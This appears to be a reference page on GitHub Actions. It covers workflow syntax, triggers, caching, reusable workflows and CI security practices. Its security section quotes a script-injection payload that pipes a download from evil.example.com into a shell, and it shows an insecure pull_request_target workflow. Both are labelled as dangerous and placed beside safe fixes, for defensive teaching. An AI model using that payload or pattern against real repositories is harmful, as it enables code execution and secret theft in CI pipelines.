---
reviewed: 2026-06-28
tags: [github, yaml]
---

# GitHub Actions

GitHub's native CI/CD platform. Workflows are defined in YAML and run in response to events on the repository (push, PR, schedule, etc.). Along with the `gh` CLI, it's the core of GitHub operations.

Official: [docs.github.com/actions](https://docs.github.com/en/actions)

## Minimal workflow

`.github/workflows/ci.yaml`:

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - uses: pnpm/action-setup@v6
        with:
          version: 10
      - uses: actions/setup-node@v6
        with:
          node-version: 24
          cache: pnpm
      - run: pnpm install --frozen-lockfile
      - run: pnpm run test
```

Files must live under `.github/workflows/`. Per-branch workflows are possible, but the version on `main` is used as the default definition.

## Triggers (`on`)

| Event | Description |
|---|---|
| `push` | Push to a branch or tag |
| `pull_request` | PR opened / synchronized / labeled, etc. |
| `schedule` | Cron format (UTC) |
| `workflow_dispatch` | Manual run (from UI or API) |
| `workflow_call` | Invoked from another workflow (reuse) |
| `repository_dispatch` | Invoked from an external API |
| `release` | On release creation |
| `issues` / `issue_comment` / `pull_request_review` | Conversation-related events |

```yaml
on:
  push:
    branches: [main]
    paths: ["src/**", "package.json"]    # only when specific paths change
  schedule:
    - cron: "0 6 * * 1"                  # every Monday 06:00 UTC
  workflow_dispatch:
    inputs:
      environment:
        description: "Target env"
        required: true
        default: "staging"
```

## Jobs and Steps

```yaml
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - run: pnpm biome ci

  test:
    runs-on: ubuntu-latest
    needs: lint                       # run after lint succeeds
    strategy:
      matrix:
        node: [20, 22, 24]
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v6
        with:
          node-version: ${{ matrix.node }}
      - run: pnpm install --frozen-lockfile
      - run: pnpm run test
```

| Concept | Description |
|---|---|
| `jobs.<id>.runs-on` | Runner type (`ubuntu-latest` / `macos-latest` / `windows-latest` / self-hosted) |
| `needs` | Dependency (runs after completion) |
| `strategy.matrix` | Parallel execution across combinations |
| `steps` | `uses` (invoke an action) or `run` (run a shell command) |
| `if` | Conditional execution (e.g. `${{ github.event_name == 'push' }}`) |

## Key official / quasi-official Actions

| Action | Purpose |
|---|---|
| `actions/checkout@v7` | Check out the repository (required) |
| `actions/setup-node@v6` | Node setup + caching |
| `pnpm/action-setup@v6` | Install pnpm |
| `actions/setup-python@v6` | Python |
| `actions/setup-go@v6` | Go |
| `actions/cache@v5` | Generic caching |
| `actions/upload-artifact@v7` / `download-artifact@v8` | Pass files between jobs |
| `actions/github-script@v9` | Call the GitHub API from Node |
| `softprops/action-gh-release@v3` | Create a release |
| `jdx/mise-action@v4` | Install tools via mise |

The common convention is **pin the major version, follow patches** (`@v4`). Full pinning (SHA) is the most secure but has the highest update overhead.

## Secrets and variables

### Secrets

```yaml
steps:
  - run: ./deploy.sh
    env:
      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

Registered under `Settings > Secrets and variables > Actions`. **Values are auto-masked when they appear in logs**, but intentional output can still leak partially, so avoid `echo "$TOKEN"`.

### Variables

Non-sensitive configuration values go in Variables (`${{ vars.ENV_NAME }}`).

### Environment

```yaml
jobs:
  deploy:
    environment: production
    steps: [...]
```

Environments let you separate secrets/vars per environment and add approval gates (essential for production deploys).

## GITHUB_TOKEN

A temporary token automatically issued for each job, with limited permissions on the repository. Default is read-only (depends on org settings).

```yaml
permissions:
  contents: write     # create commits / tags
  pull-requests: write
  issues: write
```

**Principle of least privilege**: grant only the scopes you actually need, explicitly.

## Parallelism and caching

### Caching

```yaml
- uses: actions/setup-node@v6
  with:
    cache: pnpm                       # built-in cache

# generic cache
- uses: actions/cache@v5
  with:
    path: ~/.cache/pnpm
    key: ${{ runner.os }}-pnpm-${{ hashFiles('pnpm-lock.yaml') }}
    restore-keys: |
      ${{ runner.os }}-pnpm-
```

Using `setup-node`'s `cache: pnpm` makes `actions/cache` unnecessary in most cases.

### Concurrency

Cancel a stale run when multiple pushes hit the same PR:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

## Reusable workflows

A workflow with `workflow_call` as its trigger, invoked from another workflow. **Reuse at the job level** — it runs as an independent job (shown as a separate job in the caller's Job Summary).

```yaml
# .github/workflows/reusable-test.yaml
on:
  workflow_call:
    inputs:
      node-version:
        type: string
        default: "24"
    outputs:
      coverage:
        description: "Coverage %"
        value: ${{ jobs.test.outputs.coverage }}
    secrets:
      CODECOV_TOKEN:
        required: false

jobs:
  test:
    runs-on: ubuntu-latest
    outputs:
      coverage: ${{ steps.cov.outputs.percent }}
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v6
        with:
          node-version: ${{ inputs.node-version }}
      - run: pnpm run test
      - id: cov
        run: echo "percent=92" >> "$GITHUB_OUTPUT"
```

Caller:

```yaml
jobs:
  test-20:
    uses: ./.github/workflows/reusable-test.yaml
    with:
      node-version: "20"
    secrets: inherit            # pass through all of the caller's secrets
  test-24:
    uses: ./.github/workflows/reusable-test.yaml
    with:
      node-version: "24"
    secrets:
      CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}    # pass explicitly
```

Organization-wide workflows can live in the `org/.github` repository and be referenced as `uses: org/.github/.github/workflows/foo.yaml@v1`. **Always pin a tag or SHA when referencing another repository** (`@main` sacrifices reproducibility).

## Composite Actions

Bundle multiple steps into a single reusable action. **Reuse at the step level** — it's inlined into the calling job's step list (not an independent job).

```yaml
# .github/actions/setup/action.yaml
name: setup
description: Install pnpm + Node + dependencies
inputs:
  node-version:
    required: false
    default: "24"
outputs:
  cache-hit:
    value: ${{ steps.node.outputs.cache-hit }}
runs:
  using: composite
  steps:
    - uses: pnpm/action-setup@v6
      with: { version: 10 }
    - id: node
      uses: actions/setup-node@v6
      with:
        node-version: ${{ inputs.node-version }}
        cache: pnpm
    - run: pnpm install --frozen-lockfile
      shell: bash
```

Invocation:

```yaml
- uses: ./.github/actions/setup
  with:
    node-version: "20"
```

Notes:

- A composite's `run:` requires `shell:` (reusable workflows don't need it)
- Cannot receive `secrets:` directly. Pass them via `env:` on the caller side, or expose them via `inputs:`
- Same-repo references start with `./`; external-repo references use `org/repo/path@ref`

### When to use which

| Aspect | Reusable workflow | Composite action |
|---|---|---|
| Unit | job | step |
| Shown as a separate job | yes | no |
| Matrix expansion | possible at the caller | not possible (follows the calling job's matrix) |
| Receiving `secrets:` | yes (`secrets: inherit` available) | no (must be explicit via input/env) |
| Specifying `runs-on` | possible | follows the caller |
| Use case | reusing an entire **job** — test, build, deploy, etc. | reusing a **sequence of steps** — e.g. setup routines |

## Integration with the gh CLI

```yaml
- run: gh pr comment ${{ github.event.pull_request.number }} --body "CI completed"
  env:
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

`gh` can authenticate via `GH_TOKEN`. The same commands you use locally work in CI.

## Security best practices

Think of GitHub Actions security along two axes: the **trust boundary of executed code** and **secret handling**.

### 1. Minimize `permissions:`

Restrict the org-level default `GITHUB_TOKEN` permissions to `read`, and escalate only for the jobs that need it:

```yaml
# default the whole workflow to read-only
permissions:
  contents: read

jobs:
  release:
    permissions:
      contents: write     # allow tag creation only for this job
      id-token: write     # when using OIDC
    steps: [...]
```

Job-level `permissions:` **completely replaces** the workflow-level declaration (it's not a merge). Once you write `contents: write` at the job level, every other scope is treated as ungranted.

### 2. Pin third-party actions to a SHA

Tags (`@v4`) are mutable. If a repository is compromised, a past `v4` tag can be re-pointed to a malicious commit, exfiltrating secrets via CI.

```yaml
# BAD: tag reference
- uses: some/action@v4

# GOOD: full SHA + comment with the verified version
- uses: some/action@e83ad4c089b3186b7a5da8c9d9f8c6c43ceaef5e # v4.2.0
```

Official actions (`actions/*`, `github/*`) carry little practical risk even with tag-based usage. Letting Renovate / Dependabot handle SHA updates keeps the follow-up cost low.

### 3. Script injection via untrusted input

Never expand a context that external users can control — like `${{ github.event.pull_request.title }}` or `${{ github.head_ref }}` — **directly into a shell script**. If a fork PR's title contains `"; curl evil.example.com/x.sh | sh; #`, it executes inside `run:`.

```yaml
# BAD: expanded directly into the shell
- run: echo "Title: ${{ github.event.pull_request.title }}"

# GOOD: inject as a string via env
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"
```

Dangerous context examples: `pull_request.title` / `pull_request.body` / `issue.title` / `issue.body` / `comment.body` / `head_ref` / `head.ref`.

### 4. Handling `pull_request_target`

`pull_request_target` is a special event where **the fork PR's code runs with the base repository's secrets and write permissions**. It's convenient, but if you check out the fork PR by its `ref` via `actions/checkout`, you get arbitrary code execution.

```yaml
# Dangerous: runs the PR's code with secrets attached
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.event.pull_request.head.sha }}    # ← dangerous
      - run: pnpm test
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

Principles:

- Limit it to **read-only** uses, such as commenting on or labeling fork PRs
- If you must run PR code, use `pull_request` and enable the approval gate under `Settings > Actions > Fork pull request workflows`

### 5. Secret handling

- **No structured secrets**: storing an entire JSON/YAML blob in one secret means a field referenced partially won't get masked. Split into one secret per field
- **Mask derived secrets with `::add-mask::`**: when using a value derived from a secret (JWT, signed token, etc.) in a later step, explicitly mask it with `echo "::add-mask::$DERIVED"`
- **Don't pass via CLI arguments**: they can be visible to other jobs on the same runner via `ps`. Pass via env instead
- **Fork PRs don't receive secrets**: for the `pull_request` event, secrets are not exposed to PRs from forks, but with `pull_request_target` they are exposed

### 6. Authenticate to the cloud with OIDC

Avoid storing long-lived secrets (e.g. `AWS_SECRET_ACCESS_KEY`) — obtain short-lived tokens via OIDC instead:

```yaml
permissions:
  id-token: write       # required to issue an OIDC token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubDeployRole
          aws-region: ap-northeast-1
      - run: aws s3 sync ./dist s3://my-bucket/
```

Restrict the `sub` claim (e.g. `repo:org/repo:ref:refs/heads/main`) tightly in the cloud-side trust policy. Avoid wildcards like `repo:org/*`. npm's Trusted Publishers uses the same mechanism ([`standards/npm-trusted-publishers.md`](../../standards/npm-trusted-publishers.md)).

### 7. Other

- **Dependency updates**: keep action versions up to date with Renovate / Dependabot ([`tools/renovate.md`](../../tools/renovate.md), [`platforms/github/dependabot.md`](dependabot.md))
- **Secret scanning**: integrate `gitleaks` / `trivy` into CI ([`tools/gitleaks.md`](../../tools/gitleaks.md), [`tools/trivy.md`](../../tools/trivy.md))
- **Self-hosted runners should be repo-scoped only**: enabling self-hosted runners on a public repository creates an arbitrary-code-execution risk

## Commonly used context variables

| Variable | Meaning |
|---|---|
| `${{ github.event_name }}` | Trigger name |
| `${{ github.ref }}` | `refs/heads/<branch>` or `refs/tags/<tag>` |
| `${{ github.ref_name }}` | Branch/tag name only |
| `${{ github.sha }}` | Commit SHA |
| `${{ github.actor }}` | The actor running the workflow |
| `${{ github.workspace }}` | The checkout directory |
| `${{ runner.os }}` | `Linux` / `macOS` / `Windows` |
| `${{ secrets.<NAME> }}` | Secret reference |
| `${{ vars.<NAME> }}` | Variable reference |
| `${{ steps.<id>.outputs.<name> }}` | A previous step's output |

## Passing data between steps

```yaml
steps:
  - id: meta
    run: echo "version=$(cat VERSION)" >> "$GITHUB_OUTPUT"

  - run: echo "Version is ${{ steps.meta.outputs.version }}"
```

Append `name=value` pairs to the `$GITHUB_OUTPUT` file.

### 3. Automate security scanning

- **Prevent secret leaks**: use [`gitleaks`](../../tools/gitleaks.md) to scan source code and history for API keys and other sensitive information.
- **Vulnerability scanning**: use [`trivy`](../../tools/trivy.md) to detect known vulnerabilities in dependencies, container images, and configuration files.

Building these into CI catches risks early.

## Troubleshooting

### `Resource not accessible by integration`

`permissions:` is insufficient. Add the scope requested by the error message.

### Builds are always slow

Caching isn't working. Check `setup-node`'s `cache: pnpm`. Verify `actions/cache`'s `key` includes a hash of the lockfile.

### An external action was deprecated

Let Renovate auto-update it, or migrate to the official `actions/*` equivalent (e.g. `actions/setup-node@v6` now has built-in caching too).

### Checks don't run on `pull_request`

For PRs from first-time contributors, the workflow may need to be "approved" before it runs (depends on org settings). Check `Settings > Actions > Fork pull request workflows`.

### Excluding specific combinations in a matrix

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, windows-latest]
    node: [20, 22, 24]
    exclude:
      - os: windows-latest
        node: 20
```

## Comparison with other CI systems

| Aspect | GitHub Actions | GitLab CI | CircleCI |
|---|---|---|---|
| Configuration | YAML (multiple files allowed) | YAML (basically one file) | YAML |
| GitHub integration | Native | GitHub app | GitHub app |
| Free tier | 2,000 min/month (unlimited for public repos) | 400 min/month | 6,000 credits/month |
| Self-hosted | Yes | Yes | Yes |
| Reuse | reusable / composite | include | orbs |
| OIDC | Yes (AWS/GCP/Azure) | Yes | Yes |

For workflows contained entirely within GitHub, Actions is the default choice.
